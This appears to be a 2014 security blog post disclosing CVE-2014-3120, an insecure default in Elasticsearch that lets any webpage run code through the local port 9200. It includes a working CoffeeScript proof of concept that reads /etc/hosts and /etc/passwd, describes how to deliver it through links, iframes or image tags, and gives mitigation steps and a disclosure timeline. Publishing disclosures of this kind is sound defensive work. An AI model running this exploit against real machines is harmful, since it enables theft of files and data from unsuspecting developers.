---
layout: post
title: Insecure default in Elasticsearch enables remote code execution

---

Elasticsearch has a flaw in its default configuration which makes it possible for any webpage to execute arbitrary code on visitors with Elasticsearch installed. If you're running Elasticsearch in development please read [the instructions](#how_to_secure_against_this_vulnerability) on how to secure your machine. Elasticsearch version 1.2 (which is unreleased as of writing) is not vulnerable to remote code execution, but still has some security concerns.

## The problem(s)
There are a couple of problems which enable the proof of concept I'm going to present:

* Elasticsearch has no access roles or authentication mechanism. This means that you have full control over a cluster the moment you connect to it.
* The API for Elasticsearch is accessible over <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-http.html" target="_blank">HTTP</a> and provides no CSRF protection whatsoever.
* It contains a <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html" target="_blank">feature</a> which makes it possible to evaluate expressions as part of a query. An example usage of this feature is to specify a custom scoring function while searching through documents. It uses the [MVEL](http://mvel.codehaus.org/) language by default.
* Up to version 1.2 <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_enabling_dynamic_scripting" target="_blank">dynamic scripting</a> (which makes it possible to send scripts to the cluster on the fly) was enabled by default. As mentioned in the documentation, this feature gives someone the same priviliges as the user that runs Elasticsearch. MVEL has no sandboxing at all.

There are no issues up to this point as long as you properly follow the documentation and make sure your Elasticsearch cluster is not available from the outside world. There is one target that isn't mentioned in the documentation though: The Developer! When you're developing an application that uses Elasticsearch, you probably have it running on your machine. The default port is `9200` and because there is no CSRF protection any webpage can just connect to the cluster using `localhost:9200` as the host.

## PoC
The following script will read `/etc/hosts` and `/etc/passwd` from a user visiting a webpage and display the contents in the browser.

{% highlight coffeescript %}
read_file = (filename) ->
  """
  import java.io.File;
  import java.util.Scanner;
  new Scanner(new File("#{filename}")).useDelimiter("\\\\Z").next();
  """

# This PoC assumes that there is at least one document stored in Elasticsearch, there are ways around that though
$ ->
  payload = {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {}
  }

  for filename in ["/etc/hosts", "/etc/passwd"]
    payload["script_fields"][filename] = {"script": read_file(filename)}

  $.getJSON "http://localhost:9200/_search?source=#{encodeURIComponent(JSON.stringify(payload))}&callback=?", (data) ->
    console.log(data)
    for hit in data["hits"]["hits"]
      for filename, contents of hit["fields"]
        document.write("<h2>#{filename}</h2>")
        for content in contents
          document.write("<pre>" + content + "</pre>")
        document.write("<hr>")
{% endhighlight %}

You can verify whether you're vulnerable by trying out the above PoC <a href="/blog/elasticsearch-rce/poc.html" target="_blank">here</a>.

There are many ways to exploit this, you could link the victim to the page or embed it as an Iframe. You can even exploit this by crafting a URL and using it as the `src` of an `<img>`, as the only thing that needs to happen is a single GET request. No user interaction required!

Because this is so easily exploitable you can mass-pwn developers with relatively little work.

## How to secure against this vulnerability

Add the following line to your `elasticsearch.yml` to disable dynamic scripting and prevent remote code execution:

{% highlight yaml %}
script.disable_dynamic: true
{% endhighlight %}

You should also make sure that your local Elasticsearch instance is only binding on `localhost`, as someone could exploit you over LAN without making you visit a webpage if you don't. The Homebrew Elasticsearch formula does this automatically. This still means you're vulnerable to the CSRF exploit though!

If you want to be as secure as possible, you should run Elasticsearch inside a virtual machine, to make sure it has no access to the hosting machine at all.

## Additional targets

Disabling scripting will prevent code execution, but that still leaves us with the issue of being able to query and administer the instance without limit. A webpage can easily dump the whole database running on your machine, sensitive data included. This is impossible to fix by the Elasticsearch developers without adding authentication or CSRF protection.

If an attacker can figure out the internal address of your production Elasticsearch instance, you're also open to leaking your production data. If your development machine is connected to a VPN which provides access to your Elasticsearch cluster, an attacker can easily query or [shut down](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cluster-nodes-shutdown.html) your cluster simply by making you visit a webpage.

[Hackernews](https://news.ycombinator.com/item?id=7732540)

[Reddit](http://www.reddit.com/r/netsec/comments/25cuun/insecure_default_in_elasticsearch_enables_remote/)

### Notes

* I have reserved [CVE-2014-3120](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120) for this issue.
* This exploit was tested against Elasticsearch version 1.1.1 on MacOSX installed through Homebrew. No configuration changes were made.
* I notified Elasticsearch through their [security report instructions](http://www.elasticsearch.org/community/security/) on the 26th of April 2014. They replied they were aware of it, but didn't intend to do a security release and instead [disable](https://github.com/elasticsearch/elasticsearch/issues/5853) dynamic scripting by default in version 1.2.
* This security issue has been indepently discovered and [blogged about](https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch) on December 9th 2013.

*You should follow me on Twitter [here](https://twitter.com/bvdbijl)*
